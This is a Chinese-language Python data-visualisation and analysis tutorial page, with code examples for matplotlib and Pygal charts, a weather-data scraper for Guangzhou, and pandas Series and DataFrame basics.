for i in range(len(colors)):
    # 使用自定义X坐标将数据分开
    plt.bar(x=np.arange(len(x_data))+bar_width*i, height=country_gdp_list[i], label=countries[i], color=colors[i], alpha=0.8, width=bar_width)
    # 仅为中国、美国的条柱上绘制GDP数值
    if i < 2:
        for x, y in enumerate(country_gdp_list[i]):
            plt.text(x, y + 100, '%.0f' % y, ha='center', va='bottom')
plt.xticks(np.arange(len(x_data))+bar_width*2, x_data)
plt.title("2001-2016 GDP")
plt.xlabel("years")
plt.ylabel("GDP")
plt.legend()
plt.show()

</textarea>使用Pygal柱状图来展示世界各国的人均GDP数据<textarea>
import json
import pygal
filename = 'gdp_json.json'
# 读取JSON格式的GDP数据
with open(filename) as f:
    gpd_list = json.load(f)
pop_filename = 'population-figures-by-country.json'
# 读取JSON格式的人口数据
with open(pop_filename) as f:
    pop_list = json.load(f)
# 使用list列表依次保存美国、日本、俄罗斯、加拿大的人均GDP值
country_mean_gdps = [{}, {}, {}, {}]
country_codes = ['USA', 'JPN', 'RUS', 'CAN']
# 遍历列表的每个元素,每个元素是一个GDP数据项
for gpd_dict in gpd_list:
    for i, country_code in enumerate(country_codes):
        # 只读取指定国家的数据
        if gpd_dict['Country Code'] == country_code:
            year = gpd_dict['Year']
            # 只读取2001年到2016
            if 2017 > year > 2000:
                for pop_dict in pop_list:
                    # 获取指定国家的人口数据
                    if pop_dict['Country_Code'] == country_code:
                        # 使用该国GDP总值除以人口数量,得到人均GDP
                        country_mean_gdps[i][year] = round(gpd_dict['Value']
                            / pop_dict['Population_in_%d' % year])
# 使用list列表依次保存美国、日本、俄罗斯、加拿大的人均GDP值
country_mean_gdp_list = [[], [], [], []]
# 构建时间数据
x_data = range(2001, 2017)
for i in range(len(country_mean_gdp_list)):
    for year in x_data:
        country_mean_gdp_list[i].append(country_mean_gdps[i][year])
# 定义国家名称列表
countries = ['美国', '日本', '俄罗斯', '加拿大']
# 创建pygal.Bar对象(柱状图)
bar = pygal.Bar()
# 采用循环添加代表条柱的数据
for i in range(len(countries)):
    bar.add(countries[i], country_mean_gdp_list[i])
bar.width=1100
# 设置X轴的刻度值
bar.x_labels = x_data
bar.title = '2001到2016年各国人均GDP对比'
# 设置X、Y轴的标题
bar.x_title = '年份'
bar.y_title = '人均GDP(美元)'
# 设置X轴的刻度值旋转45度
bar.x_label_rotation = 45
# 设置将图例放在底部
bar.legend_at_bottom = True
# 指定将数据图输出到SVG文件中
bar.render_to_file('mean_gdp.svg')

</textarea>使用urllib.request向lishi.tianqi.com发送请求,获取该网站的响应,然后使用Python的re模块来解析服务器响应,从中提取天气数据,最终展示2017年广州的最高气温和最低气温<textarea>
import re
from datetime import datetime
from datetime import timedelta
from matplotlib import pyplot as plt
from urllib.request import *
# 定义一个函数读取lishi.tianqi.com的数据
def get_html(city, year, month):  #①
    url = 'http://lishi.tianqi.com/' + city + '/' + str(year) + str(month) + '.html'
    request = Request(url)
    request.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; WOW64)AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36')
    response = urlopen(request)
    return response.read().decode('gbk')
dates, highs, lows = [], [], []
city = 'guangzhou'
year = '2017'
months = ['01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12']
prev_day = datetime(2016, 12, 31)
# 循环读取每个月的天气数据
for month in months:
    html = get_html(city, year, month)
    text = "".join(html.split()) # 以空格为分隔符,包含\n,将html响应拼起来
    patten = re.compile('<divclass="tqtongji2">(.*?)</div><divstyle="clear:both">') # 定义包含天气信息的div的正则表达式
    table = re.findall(patten, text)
    patten1 = re.compile('<ul>(.*?)</ul>')
    uls = re.findall(patten1, table[0])
    for ul in uls:
        patten2 = re.compile('<li>(.*?)</li>')  # 定义解析天气信息的正则表达式
        lis = re.findall(patten2, ul)
        d_str = re.findall('>(.*?)</a>', lis[0])[0] # 解析得到日期数据
        try:
            cur_day = datetime.strptime(d_str, '%Y-%m-%d') # 将日期字符串格式化为日期
            high = int(lis[1]) # 解析得到最高气温和最低气温
            low = int(lis[2])
        except ValueError:
            print(cur_day, 'date error')
        else:
            diff = cur_day - prev_day     # 计算前、后两天数据的时间差,如果前、后两天数据的时间差不是相差一天,说明数据有问题
            if diff != timedelta(days=1): print('%s之前少了%d天的数据' % (cur_day, diff.days - 1))
            dates.append(cur_day)
            highs.append(high)
            lows.append(low)
            prev_day = cur_day

fig = plt.figure(dpi=128, figsize=(12, 9))  # 配置图形
plt.plot(dates, highs, c='red', label='hightest', alpha=0.5, linewidth = 2.0)
plt.plot(dates, lows, c='blue', label='lowest', alpha=0.5, linewidth = 2.0)
plt.fill_between(dates, highs, lows, facecolor='blue', alpha=0.1)  # 为两个数据的绘图区域填充颜色
plt.title("guangzhou %s hightest vs lowest" % year)
plt.xlabel("date")
fig.autofmt_xdate()  # 该方法绘制斜着的日期标签
plt.ylabel("wendu")
plt.legend()
ax = plt.gca()
ax.spines['right'].set_color('none') # 设置右边坐标轴线的颜色(设置为none表示不显示)
ax.spines['top'].set_color('none')   # 设置顶部坐标轴线的颜色(设置为none表示不显示)
plt.show()

</textarea><pre>
【 Pygal模块 】
Pygal是另一个简单易用的数据图库,它以面向对象的方式来创建各种数据图,而且使用Pygal可以非常方便地生成各种格式的数据图,包括PNG、SVG等。使用Pygal也可以生成XML etree、HTML表格,这些都需要安装其他包

pip install pygal
在成功安装Pygal包之后可以通过pydoc来查看Pygal包的文档,python -m pydoc -p 8899,浏览http://localhost:8899/pygal.config.html

使用Pygal生成各种数据图的步骤大致如下：
1、创建Pygal数据图对象。Pygal为不同的数据图提供了不同的类,比如柱状图使用pygal.Bar类,饼图使用pygal.Pie类,折线图使用pygal.Line类等等。
2、调用数据图对象的add()方法添加数据。
3、调用Config对象的属性配置数据图。
4、调用数据图对象的render_to_xxx()方法将数据图渲染到指定的输出节点,此处的输出节点可以是PNG图片、SVG文件,也可以是其他节点

</pre>生成简单的柱状图,使用Pygal生成数据图<textarea>
import pygal
x_data = ['2011', '2012', '2013', '2014', '2015', '2016', '2017']
# 定义2个列表分别作为两组柱状图的Y轴数据
y_data = [58000, 60200, 63000, 71000, 84000, 90500, 107000]
y_data2 = [52000, 54200, 51500,58300, 56800, 59500, 62700]
# 创建pygal.Bar对象(柱状图)
bar = pygal.Bar()
# 添加两组代表条柱的数据
bar.add('C语言基础', y_data)
bar.add('Python语言基础', y_data2)
# 设置X轴的刻度值
bar.x_labels = x_data
bar.title = '编程教程的历年销量'
# 设置X、Y轴的标题
bar.x_title = '年份'
bar.y_title = '销量'
# 设置X轴的刻度值旋转45度
bar.x_label_rotation = 45
# 设置将图例放在底部
bar.legend_at_bottom = True
# 设置数据图四周的页边距,也可通过margin_bottom、margin_left、margin_right、margin_top只设置单独一边的页边距
bar.margin = 35
# 隐藏X轴上的网格线
bar.show_y_guides=False
# 显示X轴上的网格线
bar.show_x_guides=True
# 指定将数据图输出到SVG文件中,SVG文件支持交互,用浏览器打开之后当用户把鼠标指针移到某个条柱上时将可以看到关于该条柱的信息
bar.render_to_file('fk_books.svg')

</textarea>使用pygal.HorizontalBar类来表示水平柱状图。使用pygal.HorizontalBar生成水平柱状图的步骤与创建普通柱状图的步骤基本相同<textarea>
import pygal
x_data = ['2011', '2012', '2013', '2014', '2015', '2016', '2017']
# 构造数据
y_data = [58000, 60200, 63000, 71000, 84000, 90500, 107000]
y_data2 = [52000, 54200, 51500,58300, 56800, 59500, 62700]
# 创建pygal.HorizontalBar对象(水平柱状图)
horizontal_bar = pygal.HorizontalBar()
# 添加两组数据
horizontal_bar.add('C语言教程', y_data)
horizontal_bar.add('Python教程', y_data2)
# 设置Y轴(确实如此)的刻度值
horizontal_bar.x_labels = x_data
# 重新设置X轴(确实如此)的刻度值
horizontal_bar.y_labels = [20000, 40000, 60000, 80000, 100000]
horizontal_bar.title = '编程教程的历年销量'
# 设置X、Y轴的标题
horizontal_bar.x_title = '销量'
horizontal_bar.y_title = '年份'
# 设置将图例放在底部
horizontal_bar.legend_at_bottom = True
# 指定将数据图输出到SVG文件中
horizontal_bar.render_to_file('pygal.svg')

</textarea>折线图:折线图与柱状图很像,它们只是表现数据的方式不同,柱状图使用条柱代表数据,而折线图则使用折线点来代表数据。因此生成折线图的方式与生成柱状图的方式基本相同。使用pygal.Line类来表示折线图,程序创建pygal.Line对象就是创建折线图<textarea>
import pygal
x_data = ['2011', '2012', '2013', '2014', '2015', '2016', '2017']
# 构造数据
y_data = [58000, 60200, 63000, 71000, 84000, 90500, 107000]
y_data2 = [52000, 54200, 51500,58300, 56800, 59500, 62700]
# 创建pygal.Line对象(折线图)
line = pygal.Line()
# 添加两组代表折线的数据
line.add('C语言教程', y_data)
line.add('Python教程', y_data2)
# 设置X轴的刻度值
line.x_labels = x_data
# 重新设置Y轴的刻度值
line.y_labels = [20000, 40000, 60000, 80000, 100000]
line.title = '编程教程的历年销量'
# 设置X、Y轴的标题
line.x_title = '年份'
line.y_title = '销量'
# 指定将数据图输出到SVG文件中
line.render_to_file('pygal.svg')

</textarea>与水平柱状图类似的还有水平折线图,水平折线图使用pygal.HorizontalLine类来表示,水平折线图的X轴刻度值同样使用y_labels属性来设置,而 Y 轴刻度值才使用x_labels属性来设置<textarea>
import pygal
x_data = ['2011', '2012', '2013', '2014', '2015', '2016', '2017']
# 构造数据
y_data = [58000, 60200, 63000, 71000, 84000, 90500, 107000]
y_data2 = [52000, 54200, 51500,58300, 56800, 59500, 62700]
# 创建pygal.HorizontalLine对象(水平折线图)
horizontal_line = pygal.HorizontalLine()
# 添加两组代表折线的数据
horizontal_line.add('C语言教程', y_data)
horizontal_line.add('Python教程', y_data2)
# 设置Y轴(确实如此)的刻度值
horizontal_line.x_labels = x_data
# 重新设置X轴(确实如此)的刻度值
horizontal_line.y_labels = [20000, 40000, 60000, 80000, 100000]
horizontal_line.title = '编程教程的历年销量'
# 设置X、Y轴的标题
horizontal_line.x_title = '销量'
horizontal_line.y_title = '年份'
# 设置将图例放在底部
horizontal_line.legend_at_bottom = True
# 指定将数据图输出到SVG文件中
horizontal_line.render_to_file('pugal.svg')

</textarea><pre>
叠加柱状图和叠加折线图
有时客户重点关心的不是两个产品在同一年的销量对比(应该使用普通柱状图),而是两个产品的累计销量,此时应该使用叠加柱状图或叠加折线图。

对于叠加柱状图而言,代表第二组数据的条性会叠加在代表第一组数据的条柱上,这样可以更方便地看到两组数据的累加结果。叠加柱状图使用pygal.StackedBar类来表示,程序使用pygal.StackedBar创建叠加柱状图的步骤与创建普通柱状图的步骤基本相同

与叠加柱状图类似的还有叠加折线图,叠加折线图使用pygal.StackedLine类来表示,叠加折线图的第二组折线的数据点同样叠加在第一组折线的数据点上

对应的是, 如果客户需要让叠加柱状图和叠加折线图以水平方式显示,则 Pygal 提供了 pygal.HorizontalStackedBar 和 pygal.HorizontalStackedLine 类来生成水平叠加柱状图和水平叠加折线图

</pre><textarea>
import pygal
x_data = ['2011', '2012', '2013', '2014', '2015', '2016', '2017']
# 构造数据
y_data = [58000, 60200, 63000, 71000, 84000, 90500, 107000]
y_data2 = [52000, 54200, 51500,58300, 56800, 59500, 62700]
# 创建pygal.StackedBar对象(叠加柱状图)
stacked_bar = pygal.StackedBar()
# 添加两组数据
stacked_bar.add('C语言教程', y_data)
stacked_bar.add('Python教程', y_data2)
# 设置X轴的刻度值
stacked_bar.x_labels = x_data
# 重新设置Y轴的刻度值
stacked_bar.y_labels = [20000, 40000, 60000, 80000, 100000]
stacked_bar.title = '编程教程的历年销量'
# 设置X、Y轴的标题
stacked_bar.x_title = '销量'
stacked_bar.y_title = '年份'
# 指定将数据图输出到SVG文件中
stacked_bar.render_to_file('pygal.svg')

</textarea><textarea>
import pygal
x_data = ['2011', '2012', '2013', '2014', '2015', '2016', '2017']
# 构造数据
y_data = [58000, 60200, 63000, 71000, 84000, 90500, 107000]
y_data2 = [52000, 54200, 51500,58300, 56800, 59500, 62700]
# 创建pygal.StackedBar对象(叠加折线图)
stacked_line = pygal.StackedLine()
# 添加两组数据
stacked_line.add('C语言教程', y_data)
stacked_line.add('Python教程', y_data2)
# 设置X轴的刻度值
stacked_line.x_labels = x_data
# 重新设置Y轴的刻度值
stacked_line.y_labels = [20000, 40000, 60000, 80000, 100000]
stacked_line.title = '编程教程的历年销量'
# 设置X、Y轴的标题
stacked_line.x_title = '销量'
stacked_line.y_title = '年份'
# 设置将图例放在底部
stacked_line.legend_at_bottom = True
# 指定将数据图输出到SVG文件中
stacked_line.render_to_file('pygal.svg')

</textarea><pre>
饼图
Pygal提供了pygal.Pie类来支持饼图,程序在创建pygal.Pie对象之后,同样需要调用add()方法来添加统计数据。
pygal.Pie对象支持如下两个特有的属性：
inner_radius：设置饼图内圈的半径,通过设置该属性可实现环形数据图。
half_pie：将该属性设置为True,可实现半圆的饼图。

</pre><textarea>
import pygal
# 准备数据
data = [0.16881, 0.14966, 0.07471, 0.06992, 0.04762, 0.03541, 0.02925, 0.02411, 0.02316, 0.01409, 0.36326]
# 准备标签
labels = ['Java', 'C', 'C++', 'Python', 'Visual Basic .NET', 'C#', 'PHP', 'js', 'SQL', 'Assembly langugage', '其他']
# 创建pygal.Pie对象(饼图)
pie = pygal.Pie()
# 采用循环为饼图添加数据
for i, per in enumerate(data): pie.add(labels[i], per)
pie.title = '2018年8月编程语言'
# 设置将图例放在底部
pie.legend_at_bottom = True
# 设置内圈的半径长度
pie.inner_radius = 0.4
# 创建半圆数据图
pie.half_pie = True
# 指定将数据图输出到SVG文件中
pie.render_to_file('pygal.svg')

</textarea><pre>
点图
与柱状图使用条柱高度来代表数值的大小不同,点图使用点(圆)的大小来表示数值的大小。Pygal使用pygal.Dot类表示点图,创建点图的方式与创建柱状图的方式基本相同

</pre><textarea>
import pygal
x_data = ['2011', '2012', '2013', '2014', '2015', '2016', '2017']
# 构造数据
y_data = [58000, 60200, 63000, 71000, 84000, 90500, 107000]
y_data2 = [52000, 54200, 51500,58300, 56800, 59500, 62700]
# 创建pygal.Dot对象(点图)
dot = pygal.Dot()
dot.dots_size = 5
# 添加两组数据
dot.add('C语言教程', y_data)
dot.add('Python教程', y_data2)
# 设置X轴的刻度值
dot.x_labels = x_data
# 重新设置Y轴的刻度值
dot.y_labels = ['C语言教程', 'Python教程']
# 设置Y轴刻度值的旋转角度
dot.y_label_rotation = 45
dot.title = '编程教程的历年销量'
# 设置X轴的标题
dot.x_title = '年份'
# 指定将数据图输出到SVG文件中
dot.render_to_file('pygal.svg')

</textarea><pre>
仪表(Gauge)图
仪表图类似于一个仪表盘,在仪表盘内使用不同的指针代表不同的数据。Pygal使用pygal.Gauge 表示仪表图。程序在创建pygal.Gauge对象之后,为pygal.Gauge对象添加数据的方式与为pygal.Pie对象添加数据的方式相似。

pygal.Gauge对象有一个特别的属性：range,该属性用于指定仪表图的最小值和最大值

</pre><textarea>
import pygal
# 准备数据
data = [0.16881, 0.14966, 0.07471, 0.06992, 0.04762, 0.03541, 0.02925, 0.02411, 0.02316, 0.01409, 0.36326]
# 准备标签
labels = ['Java', 'C', 'C++', 'Python', 'Visual Basic .NET', 'C#', 'PHP', 'JS', 'SQL', 'Assembly langugage', '其他']
# 创建pygal.Gauge对象(仪表图)
gauge = pygal.Gauge()
gauge.range = [0, 1]
# 采用循环为仪表图添加数据
for i, per in enumerate(data): gauge.add(labels[i], per)
gauge.title = '2018年8月编程语言'
# 设置将图例放在底部
gauge.legend_at_bottom = True
# 指定将数据图输出到SVG文件中
gauge.render_to_file('pygal.svg')

</textarea><pre>
雷达图
雷达图适合用于分析各对象在不同维度的优势和劣势,通过雷达图可对比每个对象在不同维度的得分。假如从下面实例的5个方面(平台健壮性、语法易用性、社区活跃度、市场份额和未来趋势)的得分来评价各编程语言的优势。

</pre><textarea>
import pygal
# 准备数据
data = [[5, 4.0, 5, 5, 5],
    [4.8, 2.8, 4.8, 4.8, 4.9],
    [4.5, 2.9, 4.6, 4.0, 4.9],
    [4.0, 4.8, 4.9, 4.0, 5],
    [3.0, 4.2, 2.3, 3.5, 2],
    [4.8, 4.3, 3.9, 3.0, 4.5]]
# 准备标签
labels = ['Java', 'C', 'C++', 'Python',
    'C#', 'PHP']
# 创建pygal.Radar对象(雷达图)
rader = pygal.Radar()
# 采用循环为雷达图添加数据
for i, per in enumerate(labels):
    rader.add(labels[i], data[i])
rader.x_labels = ['平台健壮性', '语法易用性', '社区活跃度',
    '市场份额', '未来趋势']
rader.title = '编程语言对比图'
# 控制各数据点的大小
rader.dots_size = 8
# 设置将图例放在底部
rader.legend_at_bottom = True
# 指定将数据图输出到SVG文件中
rader.render_to_file('pygal.svg')

</textarea>
</div>

<div id="pandas">
<h4>数据分析之pandas 基础数据分析套件</h4><pre>
pip3 install pandas
import pandas as pd

对于数据挖掘来说,工作可大概分为读取数据-数据清洗-分析建模-结果展示：
1、读取数据,Pandas提供强大的IO读取工具,csv格式、Excel文件、数据库等都可以非常简便地读取,对于大数据pandas也支持大文件的分块读取
2、数据清洗,面对数据集遇到最多的情况就是存在缺失值,Pandas把各种类型数据类型的缺失值统一称为NaN(None==None是true,但np.nan==np.nan是false,NaN在官方文档中定义的是float类型),Pandas提供许多方便快捷的方法来处理这些缺失值NaN。
3、最重要的分析建模阶段,Pandas自动且明确的数据对齐特性,非常方便地使新的对象可以正确地与一组标签对齐,有了这个特性,Pandas就可以非常方便地将数据集进行拆分-重组操作。
4、最后就是结果展示阶段了,Matplotlib是个数据视图化的好工具,Pandas与Matplotlib搭配,不用复杂的代码就可以生成多种多样的数据视图。

numpy的特长并不是数据处理,而是在它能非常方便地实现科学计算,所以日常对数据进行处理时用的numpy情况并不是很多,需要处理的数据一般都是带有列标签和index索引的,而numpy并不支持这些,这时就需要pandas上场

Pandas是Python的一个数据分析包,该工具为解决数据分析任务而创建,纳入大量库和标准数据模型,提供高效的操作数据集所需的工具,提供大量能使快速便捷地处理数据的函数和方法。
Pandas是字典形式,基于NumPy创建,让NumPy为中心的应用变得更加简单

>>> import pandas as pd
>>> print([e for e in dir(pd) if not e.startswith('_')])
['Categorical', 'CategoricalDtype', 'CategoricalIndex', 'DataFrame', 'DateOffset', 'DatetimeIndex', 'DatetimeTZDtype', 'ExcelFile', 'ExcelWriter', 'Float64Index', 'Grouper', 'HDFStore', 'Index', 'IndexSlice', 'Int16Dtype', 'Int32Dtype', 'Int64Dtype', 'Int64Index', 'Int8Dtype', 'Interval', 'IntervalDtype', 'IntervalIndex', 'MultiIndex', 'NaT', 'NamedAgg', 'Period', 'PeriodDtype', 'PeriodIndex', 'RangeIndex', 'Series', 'SparseArray', 'SparseDataFrame', 'SparseDtype', 'SparseSeries', 'Timedelta', 'TimedeltaIndex', 'Timestamp', 'UInt16Dtype', 'UInt32Dtype', 'UInt64Dtype', 'UInt64Index', 'UInt8Dtype', 'api', 'array', 'arrays', 'bdate_range', 'compat', 'concat', 'core', 'crosstab', 'cut', 'date_range', 'datetime', 'describe_option', 'errors', 'eval', 'factorize', 'get_dummies', 'get_option', 'infer_freq', 'interval_range', 'io', 'isna', 'isnull', 'lreshape', 'melt', 'merge', 'merge_asof', 'merge_ordered', 'notna', 'notnull', 'np', 'offsets', 'option_context', 'options', 'pandas', 'period_range', 'pivot', 'pivot_table', 'plotting', 'qcut', 'read_clipboard', 'read_csv', 'read_excel', 'read_feather', 'read_fwf', 'read_gbq', 'read_hdf', 'read_html', 'read_json', 'read_msgpack', 'read_parquet', 'read_pickle', 'read_sas', 'read_spss', 'read_sql', 'read_sql_query', 'read_sql_table', 'read_stata', 'read_table', 'reset_option', 'set_eng_float_format', 'set_option', 'show_versions', 'test', 'testing', 'timedelta_range', 'to_datetime', 'to_msgpack', 'to_numeric', 'to_pickle', 'to_timedelta', 'tseries', 'unique', 'util', 'value_counts', 'wide_to_long']

pandas拥有种数据结构：Series和DataFrame
Series类似于NumPy中的一维数组,可以使用一维数组的可用函数和方法,而且还可以通过索引标签的方式获取数据,还具有索引的自动对齐功能;DataFrame类似于numpy中的二维数组,同样可以使用numpy数组的函数和方法,还具有一些其它灵活的使用。

【 Pandas数据结构之Series序列 】
Series是一种类似一维数组的数据结构,由一组数据和与之相关的index组成,这个结构一看似乎与dict字典差不多,字典是一种无序的数据结构,而pandas中的Series的数据结构不一样,它相当于定长有序的字典,并且它的index和value之间是独立的,两者的索引还是有区别的,Series的index是可变的,而dict字典的key值是不可变的

</pre><textarea>
import numpy as np
import pandas as pd
s=pd.Series([1, 2, 3, np.nan, 5, 6])  # 自动生成index
print(s)        # 索引在左边,值在右边
'''
0    1.0
1    2.0
2    3.0
3    NaN
4    5.0
5    6.0
dtype: float64
 '''

arr1=np.arange(5)
print(type(arr1))    # < class 'numpy.ndarray'>
print(arr1)          # array([0 1 2 3 4])
s1=pd.Series(arr1)   # 通过一维数组创建序列
print(type(s1))      # < class 'pandas.core.series.Series'>
print(s1)
'''
0    0
1    1
2    2
3    3
4    4
dtype: int32
'''

>>> pd.Series([22, 'btc', 234, 'eos'])  # 自动生成index
0     22
1    btc
2    234
3    eos
dtype: object

>>> pd.Series([1,2,3,4],index = ['a','b','c','d'])
a    1
b    2
c    3
d    4
dtype: int64

>>> data = pd.Series({'a':1, 'b':2, 'c':'as'})  # dict字典转化为Series格式
a     1
b     2
c    as
dtype: object

# 通过已有的DataFrame来创建Series
dict={'one':{'a':1,'b':2,'c':3,'d':4},'two':{'a':5,'b':6,'c':7,'d':8},'three':{'a':9,'b':10,'c':11,'d':12}}
df=pd.DataFrame(dict)
s=df['one']    #直接拿出数据框3中第一列
print(s)
s=df.iloc[0]   # df['a'] #直接拿出数据框中第一行--iloc
print(s)
'''
   one  two  three
a    1    5      9
b    2    6     10
c    3    7     11
d    4    8     12
a    1
b    2
c    3
d    4
Name: one, dtype: int64
one      1
two      5
three    9
Name: a, dtype: int64
'''

# 查看Series的相关信息
>>> data.index
Index(['a', 'b', 'c'], dtype='object')
>>> data.values
array([1, 2, 'as'], dtype=object)
>>> 'a' in data  # in方法默认判断的是index值
True

</textarea><pre>
【 数据索引index 】
无论数据框还是序列,最左侧始终有一个非原始数据对象,这个就是数据索引。通过索引获取目标数据,对数据进行一系列的操作。

</pre>通过索引值或索引标签获取数据<textarea>
s=pd.Series(np.array([1,2,3,4,5,6]))
print(s) #如果不给序列一个指定索引值,序列会自动生成一个从0开始的自增索引
'''
0 1
1 2
2 3
3 4
4 5
5 6
dtype: int32
'''
s.index                             # 通过index属性获取序列的索引值
RangeIndex(start=0, stop=6, step=1)

s.index=['a','b','c','d','e','f']  # 为index重新赋值
s
'''
a    1
b    2
c    3
d    4
e    5
f    6
dtype: int32
'''
s[3]    # 通过索引获取数据
4
s['e']
5
s[[1,3,5]]
b 2
d 4
f 6
dtype: int32
s[:4]
a 1
b 2
c 3
d 4
dtype: int32
s['c':]
c 3
d 4
e 5
f 6
dtype: int32
s['b':'e'] #通过索引标签获取数据,末端标签的数据也是返回的,
b 2
c 3
d 4
e 5
dtype: int32

</textarea><pre>
Series的NaN生成
Series的生成依据的是index值,index'a'在字典dic的key中并不存在,Series自然也找不到'a'的对应value值,这种情况下Pandas就会自动生成NaN(not a number)来填补缺失值,这里还有个有趣的现象,原本dtype是int类型,生成NaN后就变成了float类型了,因为NaN的官方定义就是float类型

查询NaN值不要使用np.nan==np.nan这种形式来作为判断条件,结果永远是False,==是用作值判断的,而NaN并没有值,如果不想使用isnull、notnull的判断方法,可以使用is作为判断方法,is是对象引用判断,np.nan is np.nan结果是的True

</pre><textarea>
>>> index1 = [ 'a','b','c','d']
>>> dic = {'b':1,'c':1,'d':1}
>>> data2 = Series(dic,index=index1)
>>> data2
a    NaN
b    1.0
c    1.0
d    1.0
dtype: float64

# NaN的相关查询
>>> data2.isnull()
a     True
b    False
c    False
d    False
dtype: bool
>>> data2.notnull()
a    False
b     True
c     True
d     True
dtype: bool
>>> data2[data2.isnull() == True]  # #嵌套查询NaN
a   NaN
dtype: float64
>>> data2.count()    #统计非NaN个数
3

</textarea><pre>
Series自动对齐
在算术运算中Series会自动寻找匹配的index值进行运算,如果index不存在匹配则自动赋予NaN,任何数+NaN=NaN,可以把NaN理解为吸收一切的黑洞
对于数据框的对齐,不仅是行索引的自动对齐,同时也会对列索引进行自动对齐,数据框相当于二维数组的推广

<textarea>
>>> data1
a      1
asd    1
b      1
dtype: int64
>>> data
a    1
b    2
c    3
d    4
dtype: int64
>>> data + data1
a      2.0
asd    NaN
b      3.0
c      NaN

s6=pd.Series(np.array([10,15,20,30,55,80]),index=['a','b','c','d','e','f'])
s7=pd.Series(np.array([12,11,13,15,14,16]),index=['a','c','g','b','d','f'])
print(s6+s7)  # s6中不存在g索引,s7中不存在e索引,所以数据运算会产生两个缺失值NaN。
print(s6/s7)
'''
a    22.0
b    30.0
c    31.0
d    44.0
e     NaN
f    96.0
g     NaN
dtype: float64
a    0.833333
b    1.000000
c    1.818182
d    2.142857
e         NaN
f    5.000000
g         NaN
dtype: float64
'''

</textarea><pre>
Series的name属性
Series对象本身及其索引index都有一个name属性,name属性主要发挥作用是在DataFrame中,当把一个Series对象放进DataFrame中,新的列将根据name属性对该列进行命名,如果没有给Series命名,DataFrame则会自动命名为0。

</pre><textarea>
>>> data.index.name = 'abc'
>>> data.name = 'test'
>>> data
abc
a    1
b    2
c    3
d    4
Name: test, dtype: int64

</textarea><pre>
pandas查询数据
通过布尔索引有针对的选取原数据的子集,指定行,指定列等。

dict={
    'one':{'a':1,'b':2,'c':3,'d':4,'e':5,'f':6,'g':7},
    'two':{'a':8,'b':9,'c':10,'d':11,'e':12,'f':13,'g':14},
    'three':{'a':15,'b':16,'c':17,'d':18,'e':19,'f':20,'g':21}
}
df=pd.DataFrame(dict)
df
   one  two  three
a    1    8     15
b    2    9     16
c    3   10     17
d    4   11     18
e    5   12     19
f    6   13     20
g    7   14     21
df.head()          # 默认查询数据的前5行,可以在括号中更改返回的行数
   one  two  three
a    1    8     15
b    2    9     16
c    3   10     17
d    4   11     18
e    5   12     19
df.tail()          # 默认查询数据的末尾5行,可以在括号中更改返回的行数
   one  two  three
c    3   10     17
d    4   11     18
e    5   12     19
f    6   13     20
g    7   14     21
df.iloc[[1,6]]        # 查询指定的行
   one  two  three
b    2    9     16
g    7   14     21
df[['one', 'three']].head()     # 查询指定的列
   one  three
a    1     15
b    2     16
c    3     17
d    4     18
e    5     19
df.loc[['a','e'],['one', 'three']]  # 查询指定的行和列
   one  three
a    1     15
e    5     19
df[df['one']==3].head()  # 通过布尔索引实现数据的自己查询
   one  two  three
c    3   10     17
df[(df['one']>3) & (df['three']>=19)].head() # 当有多个条件的查询,需要在&或者|的两端的条件括起来
   one  two  three
e    5   12     19
f    6   13     20
g    7   14     21
df[(df['one']>3) & (df['three']>=19)][['two','three']].head()  # 只选取指定列
   two  three
e   12     19
f   13     20
g   14     21

</pre><pre>
【 Pandas数据结构之DataFrame 】
DataFrame是表格型数据结构,包含一组有序的列,每列可以是不同的值类型。DataFrame有行索引和列索引,可以看成由Series组成的字典。

DataFrame这种数据结构可以把它看作是一张二维表,DataFrame长得跟Excel表格差不多,DataFrame的横行称为columns,竖列和Series一样称为index,DataFrame每一列可以是不同类型的值集合,所以DataFrame也可以把它视为不同数据类型同一index的Series集合

DataFrame的生成与Series差不多,可以自定义index,也可不指定,DataFrame会自动补上

选择数据
只选择一列可以使用df['列名']
选择多个列可以使用df[['Group', 'Contour', 'Depth']]

子集选择/索引：如果要选择特定的子集,可以使用.loc或.iloc方法：
df.loc[:,['Contour']]：选择Contour列的所有数据,单冒号:选择所有行。在逗号的左侧可以指定所需的行,并在逗号的右侧指定列。
df.loc[0:4,['Contour']]：选择“Contour”列的0到4行。
df.iloc[:,2]：选择第二列的所有数据。
df.iloc[3,:]：选择第三行的所有数据。

数值替换
df.replace({'Topk': 'Top'}, inplace=True)

删除空值
df['pH'].dropna(inplace=True)

输入空值
df['pH'].fillna(df['pH'].mean(), inplace=True) #nulls are imputed with mean of pH column

删除行和列,axis = 0表示删除行,axis = 1来删除列
df.drop(columns = ['Na'], inplace = True) #This drops the 'Na' column
df.drop(2, axis=0, inplace=True)          #This drops the row at index 2

更改列名称
df.rename(columns = {'Conduc' : 'Cond', 'Dens' : 'Density'}, inplace = True)

数据处理
可以使用.apply在数据.apply的行或列中应用函数
df['Cond'].apply(np.sqrt) # 将平方根应用于“Cond”列中的所有值

数据分组
有时需要将数据分组来更好地观察数据间的差异。Pandas中提供以下几种方式对数据进行分组。 下面的示例按“Contour”列对数据进行分组,并计算“Ca”列中记录的平均值,总和或计数。
df.groupby(by=['Contour'])['Ca'].mean()
df.groupby(by=['Contour'])['Ca'].count()
df.groupby(by=['Contour'])['Ca'].sum()

也可以按多列进行数据分组。
df.groupby(by=['Contour', 'Gp'])['Ca'].mean()

合并多个DataFrame
将两个数据合并在一起有两种方法,即concat和merge。Concat适用于堆叠多个数据帧的行。
按列连接数据
pd.concat([df, df2], axis=1)

按行连接数据
pd.concat([df, df2], axis=0)

当数据帧之间有公共列时合并适用于组合数据帧。

合并数据
pd.merge(df, df2, left_on='Contour', right_on='Contour', how='outer')

数据保存
在完成数据清洗后就需要将数据输出到csv或excel文件中保存

如果要将数据输出到由制表符分隔的csv文件,请使用以下代码。 ''表示您希望它以制表符分隔。
df.to_csv('myDataFrame.csv', sep='')

输出到excel：
writer = pd.ExcelWriter('myDataFrame.xlsx')
df.to_excel(writer,'DataFrame')
writer.save()

</pre><textarea>
# 通过二维数组创建数据框
arr=np.array(np.arange(12)).reshape(4,3)
print(type(arr))
print(arr)
df=pd.DataFrame(arr)
print(type(df))
print(df)
'''
< class 'numpy.ndarray'>
[[ 0  1  2]
 [ 3  4  5]
 [ 6  7  8]
 [ 9 10 11]]
